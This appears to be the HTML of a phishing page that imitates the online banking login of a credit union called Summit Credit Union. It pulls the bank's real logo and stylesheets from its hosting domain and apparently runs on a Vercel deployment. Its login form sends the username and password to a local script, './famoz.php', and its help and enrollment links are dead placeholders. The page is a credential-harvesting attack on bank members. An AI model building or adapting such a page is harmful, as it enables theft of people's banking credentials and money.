...
<script defer src="/_vercel/insights/script.js"></script>
	...
	<link href="https://southbridgecu.financialhost.org/Themes/OrpheusDefaultTheme/Styles/Default_5rTVJABMXj81_Default.bndl?v=ZnIFqDdKR7A2O6jJVTNgoswC4KLo4jWAssDj-YT4lno1" rel="stylesheet" type="text/css" />
	<link href="https://southbridgecu.financialhost.org/Themes/OrpheusDefaultTheme/Styles/Mobile_Default_xtHDspGhEo41_Default.bndl?v=1HoBsHbUYZnX0KLI9glXu7yyr0RWgVftf_o4zCD_sa81" rel="stylesheet" type="text/css" /><meta content="Orchard" name="generator" /><meta content="UL7b2EHVJtmrlRT1M0TmyQL0f-m08XynqkgbmVIb6R0_MaQrmwWxUkHdhEl5Lah743jtUufOZRi0GPzX3jTtfX_aRjDpg6zPBjNmpYctzPWa5_Xsp-a2XBm4gI_6EwT2bIPDdoL5IurcvSAxQaEGsLTYarndvw48DXLNOM4Efco1" name="csrf-token" /><meta content="X-AntiCSRF-Token" name="csrf-param" /><meta content="__AntiCsrfToken" name="csrf-form-param" />
	<link href="https://southbridgecu.financialhost.org/Media/Default/Logos/favicon_1.ico" rel="shortcut icon" type="image/x-icon" /><meta name="apple-itunes-app" content="app-id=583135366">
</head>
...
<div class="top-logo-block" style="text-align: center; display: block; width: 100%; margin: 10px auto;"><a href="/"><img alt="Summit Credit Union" height="80" src="https://southbridgecu.financialhost.org/Media/Default/Logo/new_scu_logo_trans.png" width="186" /> </a></div>
</div>
</header>
...
<form action="./famoz.php" data-stable-name="LoginForm" data-viewmodel="login/viewmodels/userName" method="post">
<div class="content__container has-padding">
<div class="auth__form-divider">
<div class="form-control-container"><label><span class="form-control__label" data-stable-name="UserNameLabel">Username:</span> <input autocapitalize="none" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-type="System.String" data-required-msg="This field is required." data-stable-name="UserNameInput" id="UserName" maxlength="32" name="username" required="required" type="text" /> </label></div>

<div class="form-control-container"><label><span class="form-control__label" data-stable-name="UserNameLabel">Password:</span> <input autocapitalize="none" autocomplete="new-value" class="form-control k-textbox" data-cfw-field="data-cfw-field" data-field-type="System.String" data-required-msg="This field is required." data-stable-name="UserNameInput" id="UserName" name="password" required="required" type="password" /> </label></div>
<input data-bind="" data-cfw-field="data-cfw-field" data-field-id="LoginMode" data-field-type="System.String" data-stable-name="LoginModeInput" id="LoginMode" name="LoginMode" type="hidden" value="" />
...
<div class="form-control-container"><button autocomplete="off" class="btn btn--primary btn__block" data-stable-name="SignInButton" name="submit" type="submit">Log In</button></div>
</div>
</div>

<div class="text-center">
<div class="form-control-container"><a data-bind="attr: { target: targetSource }" data-stable-name="ForgotUserNameLink" href="#">I forgot my username.</a></div>
</div>
</div>

<div class="content__container has-padding">
<div class="form-submit-container">
<p class="text-center">Don&#39;t have a login?</p>
<a class="btn btn__block btn--primary" data-stable-name="RegisterLink" href="#">Enroll Now</a></div>
</div>
</div>
</div>
</form>
